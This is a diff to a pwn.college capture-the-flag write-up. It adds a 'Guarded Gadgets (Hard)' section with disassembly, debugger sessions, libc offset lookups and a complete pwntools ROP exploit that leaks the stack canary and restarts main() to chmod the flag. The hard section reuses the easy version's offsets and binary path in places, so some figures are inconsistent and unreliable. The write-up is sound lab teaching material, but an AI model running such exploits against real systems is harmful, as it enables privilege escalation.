@@ -11749,18 +11749,6 @@ call *rax                       ← restarts main() cleanly
 2. Compute all gadget and function addresses from libc base.
 3. Send `chmod("!", 0o777)` ROP chain — the binary runs with elevated privileges so the `chmod` succeeds.
 
-### `puts@plt` (Procedure Linkage Table entry)
-
-```
-hacker@return-oriented-programming~guarded-gadgets-easy:~$ objdump -d /challenge/guarded-gadgets-easy | grep "<puts@plt>:"
-0000000000001140 <puts@plt>:
-```
-
-```
-hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -r /challenge/guarded-gadgets-easy | grep "puts"
-000000004f78  000400000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
-```
-
 ### Binary analysis
 
 #### `main()`
@@ -12466,9 +12454,485 @@ for attempt in range(200):
 ```
 
 ```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ ln -sf /flag ~/!
+```
+
+```
 hacker@return-oriented-programming~guarded-gadgets-easy:~$ python ~/script.py
 pwn.college{EwvqUFwVkwAXrQr4sJKdJ-VRMN4.0VN2MDL4ITM0EzW}
 ```
 
 &nbsp;
 
+## Guarded Gadgets (Hard)
+
+```
+hacker@return-oriented-programming~guarded-gadgets-hard:~$ /challenge/guarded-gadgets-hard 
+###
+### Welcome to /challenge/guarded-gadgets-hard!
+###
+
+[LEAK] Your input buffer is located at: 0x7ffe23227280.
+
+Address in hex to read from:
+```
+
+We need the following:
+
+- [ ] Offset between buffer and stack canary 
+- [ ] Offset between buffer and stored return address to `main()`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### Strategy
+ 
+Three problems to solve: canary, ASLR, and privilege. The trick is doing it in **two stages within the same process**, so ASLR is defeated for free on the second stage.
+Same the [easy version](#strategy).
+
+### Binary analysis
+
+#### `main()`
+
+```
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x00000000000018e6 <+0>:     endbr64
+   0x00000000000018ea <+4>:     push   rbp
+   0x00000000000018eb <+5>:     mov    rbp,rsp
+   0x00000000000018ee <+8>:     sub    rsp,0xd0
+   0x00000000000018f5 <+15>:    mov    DWORD PTR [rbp-0xb4],edi
+   0x00000000000018fb <+21>:    mov    QWORD PTR [rbp-0xc0],rsi
+   0x0000000000001902 <+28>:    mov    QWORD PTR [rbp-0xc8],rdx
+   0x0000000000001909 <+35>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000001912 <+44>:    mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000001916 <+48>:    xor    eax,eax
+   0x0000000000001918 <+50>:    lea    rdi,[rip+0x6e9]        # 0x2008
+   0x000000000000191f <+57>:    call   0x10c0 <puts@plt>
+   0x0000000000001924 <+62>:    mov    rax,QWORD PTR [rbp-0xc0]
+   0x000000000000192b <+69>:    mov    rax,QWORD PTR [rax]
+   0x000000000000192e <+72>:    mov    rsi,rax
+   0x0000000000001931 <+75>:    lea    rdi,[rip+0x6d4]        # 0x200c
+   0x0000000000001938 <+82>:    mov    eax,0x0
+   0x000000000000193d <+87>:    call   0x10e0 <printf@plt>
+   0x0000000000001942 <+92>:    lea    rdi,[rip+0x6bf]        # 0x2008
+   0x0000000000001949 <+99>:    call   0x10c0 <puts@plt>
+   0x000000000000194e <+104>:   mov    edi,0xa
+   0x0000000000001953 <+109>:   call   0x10b0 <putchar@plt>
+   0x0000000000001958 <+114>:   mov    rax,QWORD PTR [rip+0x26c1]        # 0x4020 <stdin@@GLIBC_2.2.5>
+   0x000000000000195f <+121>:   mov    ecx,0x0
+   0x0000000000001964 <+126>:   mov    edx,0x2
+   0x0000000000001969 <+131>:   mov    esi,0x0
+   0x000000000000196e <+136>:   mov    rdi,rax
+   0x0000000000001971 <+139>:   call   0x1100 <setvbuf@plt>
+   0x0000000000001976 <+144>:   mov    rax,QWORD PTR [rip+0x2693]        # 0x4010 <stdout@@GLIBC_2.2.5>
+   0x000000000000197d <+151>:   mov    ecx,0x1
+   0x0000000000001982 <+156>:   mov    edx,0x2
+   0x0000000000001987 <+161>:   mov    esi,0x0
+   0x000000000000198c <+166>:   mov    rdi,rax
+   0x000000000000198f <+169>:   call   0x1100 <setvbuf@plt>
+   0x0000000000001994 <+174>:   mov    eax,DWORD PTR [rbp-0xb4]
+   0x000000000000199a <+180>:   mov    DWORD PTR [rbp-0xa8],eax
+   0x00000000000019a0 <+186>:   mov    rax,QWORD PTR [rbp-0xc0]
+   0x00000000000019a7 <+193>:   mov    QWORD PTR [rbp-0x98],rax
+   0x00000000000019ae <+200>:   mov    rax,QWORD PTR [rbp-0xc8]
+   0x00000000000019b5 <+207>:   mov    QWORD PTR [rbp-0x90],rax
+   0x00000000000019bc <+214>:   lea    rax,[rbp-0x80]
+   0x00000000000019c0 <+218>:   mov    rsi,rax
+   0x00000000000019c3 <+221>:   lea    rdi,[rip+0x656]        # 0x2020
+   0x00000000000019ca <+228>:   mov    eax,0x0
+   0x00000000000019cf <+233>:   call   0x10e0 <printf@plt>
+   0x00000000000019d4 <+238>:   mov    QWORD PTR [rbp-0xa0],0x0
+   0x00000000000019df <+249>:   lea    rdi,[rip+0x668]        # 0x204e
+   0x00000000000019e6 <+256>:   call   0x10c0 <puts@plt>
+   0x00000000000019eb <+261>:   lea    rax,[rbp-0xa0]
+   0x00000000000019f2 <+268>:   mov    rsi,rax
+   0x00000000000019f5 <+271>:   lea    rdi,[rip+0x66f]        # 0x206b
+   0x00000000000019fc <+278>:   mov    eax,0x0
+   0x0000000000001a01 <+283>:   call   0x1110 <__isoc99_scanf@plt>
+   0x0000000000001a06 <+288>:   mov    rax,QWORD PTR [rbp-0xa0]
+   0x0000000000001a0d <+295>:   mov    rax,QWORD PTR [rax]
+   0x0000000000001a10 <+298>:   mov    QWORD PTR [rbp-0x88],rax
+   0x0000000000001a17 <+305>:   mov    rax,QWORD PTR [rbp-0xa0]
+   0x0000000000001a1e <+312>:   mov    rdx,QWORD PTR [rbp-0x88]
+   0x0000000000001a25 <+319>:   mov    rsi,rax
+   0x0000000000001a28 <+322>:   lea    rdi,[rip+0x63f]        # 0x206e
+   0x0000000000001a2f <+329>:   mov    eax,0x0
+   0x0000000000001a34 <+334>:   call   0x10e0 <printf@plt>
+   0x0000000000001a39 <+339>:   lea    rax,[rbp-0x80]
+   0x0000000000001a3d <+343>:   mov    edx,0x1000
+   0x0000000000001a42 <+348>:   mov    rsi,rax
+   0x0000000000001a45 <+351>:   mov    edi,0x0
+   0x0000000000001a4a <+356>:   call   0x10f0 <read@plt>
+   0x0000000000001a4f <+361>:   mov    DWORD PTR [rbp-0xa4],eax
+   0x0000000000001a55 <+367>:   lea    rdi,[rip+0x62b]        # 0x2087
+   0x0000000000001a5c <+374>:   call   0x10c0 <puts@plt>
+   0x0000000000001a61 <+379>:   nop
+   0x0000000000001a62 <+380>:   lea    rdi,[rip+0x627]        # 0x2090
+   0x0000000000001a69 <+387>:   call   0x10c0 <puts@plt>
+   0x0000000000001a6e <+392>:   mov    eax,0x0
+   0x0000000000001a73 <+397>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000001a77 <+401>:   xor    rcx,QWORD PTR fs:0x28
+   0x0000000000001a80 <+410>:   je     0x1a87 <main+417>
+   0x0000000000001a82 <+412>:   call   0x10d0 <__stack_chk_fail@plt>
+   0x0000000000001a87 <+417>:   leave
+   0x0000000000001a88 <+418>:   ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `main+356`, where the `read()` call is made, in order to find the buffer offset to the canary and saved RIP.
+
+```
+pwndbg> break *(main+356)
+Breakpoint 1 at 0x1a4a
+```
+
+```
+pwndbg> run
+Starting program: /challenge/guarded-gadgets-hard 
+Downloading separate debug info for system-supplied DSO at 0x7ffcf13f9000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffcf13f9000.                                                                  
+###
+### Welcome to /challenge/guarded-gadgets-hard!
+###
+
+[LEAK] Your input buffer is located at: 0x7ffcf1340c70.
+
+Address in hex to read from:
+0x7ffcf1340c70
+[LEAK] *0x7ffcf1340c70 = 0x0000000000000000
+
+
+Breakpoint 1, 0x0000641a475e0a4a in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
+Breakpoint hit at 0x641a475e0a4a
+────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
+ RAX  0x7ffcf1340c70 ◂— 0
+ RBX  0x641a475e0a90 (__libc_csu_init) ◂— endbr64
+ RCX  0
+ RDX  0x1000
+ RDI  0
+ RSI  0x7ffcf1340c70 ◂— 0
+ R8   0x2d
+ R9   0x2d
+ R10  0x641a475e1084 ◂— 0x697661654c000a0a /* '\n\n' */
+ R11  0x246
+ R12  0x641a475e0120 (_start) ◂— endbr64
+ R13  0x7ffcf1340de0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffcf1340cf0 ◂— 0
+ RSP  0x7ffcf1340c20 ◂— 0
+ RIP  0x641a475e0a4a (main+356) ◂— call read@plt
+─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
+ ► 0x641a475e0a4a <main+356>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7ffcf1340c70 ◂— 0
+        nbytes: 0x1000
+ 
+   0x641a475e0a4f <main+361>    mov    dword ptr [rbp - 0xa4], eax
+   0x641a475e0a55 <main+367>    lea    rdi, [rip + 0x62b]              RDI => 0x641a475e1087 ◂— 'Leaving!'
+   0x641a475e0a5c <main+374>    call   puts@plt                    <puts@plt>
+ 
+   0x641a475e0a61 <main+379>    nop   
+   0x641a475e0a62 <main+380>    lea    rdi, [rip + 0x627]     RDI => 0x641a475e1090 ◂— '### Goodbye!'
+   0x641a475e0a69 <main+387>    call   puts@plt                    <puts@plt>
+ 
+   0x641a475e0a6e <main+392>    mov    eax, 0                       EAX => 0
+   0x641a475e0a73 <main+397>    mov    rcx, qword ptr [rbp - 8]
+   0x641a475e0a77 <main+401>    xor    rcx, qword ptr fs:[0x28]
+   0x641a475e0a80 <main+410>    je     main+417                    <main+417>
+───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcf1340c20 ◂— 0
+01:0008│-0c8 0x7ffcf1340c28 —▸ 0x7ffcf1340df8 —▸ 0x7ffcf1342ea3 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-0c0 0x7ffcf1340c30 —▸ 0x7ffcf1340de8 —▸ 0x7ffcf1342e83 ◂— '/challenge/guarded-gadgets-hard'
+03:0018│-0b8 0x7ffcf1340c38 ◂— 0x100000000
+04:0020│-0b0 0x7ffcf1340c40 ◂— 0
+05:0028│-0a8 0x7ffcf1340c48 ◂— 1
+06:0030│-0a0 0x7ffcf1340c50 —▸ 0x7ffcf1340c70 ◂— 0
+07:0038│-098 0x7ffcf1340c58 —▸ 0x7ffcf1340de8 —▸ 0x7ffcf1342e83 ◂— '/challenge/guarded-gadgets-hard'
+─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x641a475e0a4a main+356
+   1   0x757e58b54083 __libc_start_main+243
+   2   0x641a475e014e _start+46
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Offset between buffer and stack canary
+   - Location of the buffer: `0x7ffcf1340c70`
+- [ ] Offset between buffer and stored return address to `main()`
+   - Location of the buffer: `0x7ffcf1340c70`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7ffcf1340d00:
+ rip = 0x641a475e0a4a in main; saved rip = 0x757e58b54083
+ called by frame at 0x7ffcf1340dd0
+ Arglist at 0x7ffcf1340cf0, args: 
+ Locals at 0x7ffcf1340cf0, Previous frame's sp is 0x7ffcf1340d00
+ Saved registers:
+  rbp at 0x7ffcf1340cf0, rip at 0x7ffcf1340cf8
+```
+
+Just need to calculate the differences now.
+
+```
+pwndbg> p/d 0x7ffcf1340ce8 - 0x7ffcf1340c70
+$1 = 120
+pwndbg> p/d 0x7ffcf1340cf8 - 0x7ffcf1340c70
+$2 = 136
+```
+
+- [x] Offset between buffer and stack canary: `120`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`
+- [x] Offset between buffer and stored return address to `main()`: `136`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+
+### ROP gadgets
+
+We can look for the required ROP gadgets within Libc.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-hard:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
+0x0000000000023b6a : pop rdi ; ret
+0x00000000000f57ad : pop rdi ; retf
+0x0000000000144ba9 : pop rdi ; retf 0xa
+```
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rsi ; ret"
+0x000000000014b56c : cmp ecx, 0x3d8d48ff ; pop rsi ; ret
+0x000000000002601f : pop rsi ; ret
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+### Libc functions
+
+Let's first find the offset of `system()` within Libc from the base address of the Libc.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
+  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [ ] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+
+Let's find a relevant NULL terminated string.
+
+```
+hacker@return-oriented-programming~guarded-gadgets-hard:~$ objdump -s -j .rodata /challenge/guarded-gadgets-hard | grep -E "[0-9a-f]{2}00"
+ 2000 01000200 00000000 23232300 23232320  ........###.### 
+ 2010 57656c63 6f6d6520 746f2025 73210a00  Welcome to %s!..
+ 2040 74656420 61743a20 25702e0a 0a004164  ted at: %p....Ad
+ 2060 72656164 2066726f 6d3a0025 70005b4c  read from:.%p.[L
+ 2080 366c6c78 0a0a004c 65617669 6e672100  6llx...Leaving!.
+```
+
+- [x] Offset between buffer and stack canary: `72`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
+- [x] Offset between buffer and stored return address to `main()`: `88`
+   - Location of the buffer: `0x7ffe0e9228a0`
+   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+- [ ] Location of a NULL terminated string: `0x37e4`
+- [x] Offsets of required Libc functions
+   - Offset of `system()` within Libc: `0x52290`
+   - Offset of `chmod()` within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets
+   - `pop rdi ; ret`: `0x23b6a`
+   - `pop rsi ; ret`: `0x2601f`
+
+### Leaking Libc base
+
+The binary doesn't print any libc addresses. However, the saved RIP sitting at `buf + 88` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
+
+From the backtrace:
+
+```
+1   0x737019aac083 __libc_start_main+243
+```
+
+```
+pwndbg> x/gx 0x7ffe0e9228f8
+0x7ffe0e9228f8: 0x0000737019aac083
+```
+
+```
+pwndbg> p/x 0x737019aac083 - 0x24083
+$3 = 0x737019a88000
+```
+
+- Saved RIP: `0x737019aac083`
+- `__libc_start_main+243` is at libc offset `0x24083`
+- libc base: `0x737019aac083 - 0x24083 = 0x737019a88000`
+
+From there all function and gadget addresses follow:
+
+```
+pop_rdi = 0x737019a88000 + 0x23b6a = 0x737019aab56a
+pop_rsi = 0x737019a88000 + 0x2601f = 0x737019aae01f
+chmod   = 0x737019a88000 + 0x10dd80 = 0x737019b95d80
+```
+
+### ROP chain
+
+The ROP chain would be the exact same as the [easy challenge](#rop-chain-2).
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import struct
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+# Libc offsets
+LSM_243_OFF = 0x24083   # __libc_start_main+243 (saved RIP)
+TARGET_OFF  = 0x24069   # restart: loads argv/argc/main then calls main
+pop_rdi_off = 0x23b6a
+pop_rsi_off = 0x2601f
+chmod_off   = 0x10dd80
+
+TARGET_LOW16 = TARGET_OFF & 0xFFFF
+
+for attempt in range(200):
+    nibble = attempt % 16
+    restart_bytes = struct.pack('<H', (nibble * 0x1000 + TARGET_LOW16) & 0xFFFF)
+
+    p = process('/challenge/guarded-gadgets-easy')
+    try:
+        # --- STAGE 1: Leak canary, 2-byte partial overwrite → restart main() ---
+        p.recvuntil(b'located at: ')
+        buf = int(p.recvline().strip().rstrip(b'.'), 16)
+
+        # Leak canary at buf + 72
+        p.recvuntil(b'Address in hex to read from:')
+        p.sendline(hex(buf + 72).encode())
+        p.recvuntil(b' = 0x')
+        canary = int(p.recvline().strip(), 16)
+
+        # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
+        p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
+
+        try:
+            p.recvuntil(b'located at: ', timeout=2)
+        except Exception:
+            p.close()
+            continue
+
+        # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
+        buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
+
+        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
+        p.recvuntil(b'Address in hex to read from:')
+        p.sendline(hex(buf2 + 88).encode())
+        p.recvuntil(b' = 0x')
+        libc_base = int(p.recvline().strip(), 16) - LSM_243_OFF
+
+        if libc_base & 0xfff != 0:
+            p.close()
+            continue
+
+        # Compute gadget and function addresses from libc base
+        pop_rdi = libc_base + pop_rdi_off
+        pop_rsi = libc_base + pop_rsi_off
+        chmod   = libc_base + chmod_off
+
+        # Write "!\x00" at buf2 so buf2 itself is a valid path string for chmod.
+        # ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
+        payload = flat(
+            b'!\x00' + b'A' * 70,   # "!\x00" at buf2, pad to canary
+            p64(canary),
+            p64(0),                  # saved RBP
+
+            # chmod(buf2, 0o777)
+            pop_rdi, buf2,
+            pop_rsi, 0o777,
+            chmod,
+        )
+
+        p.send(payload)
+        p.recvall(timeout=3)
+
+        try:
+            flag = open('/flag').read()
+            if 'pwn.college{' in flag:
+                print(flag)
+                break
+        except PermissionError:
+            pass
+
+    except Exception:
+        pass
+    finally:
+        try: p.close()
+        except: pass
+```
+
+```
+hacker@return-oriented-programming~guarded-gadgets-hard:~$ ln -sf /flag ~/!
+```
+
+```
+hacker@return-oriented-programming~guarded-gadgets-hard:~$ python ~/script.py
+pwn.college{cuAFnOlGqi0aaNd1OJwtlLU09th.0lN2MDL4ITM0EzW}
+```
+
+&nbsp;
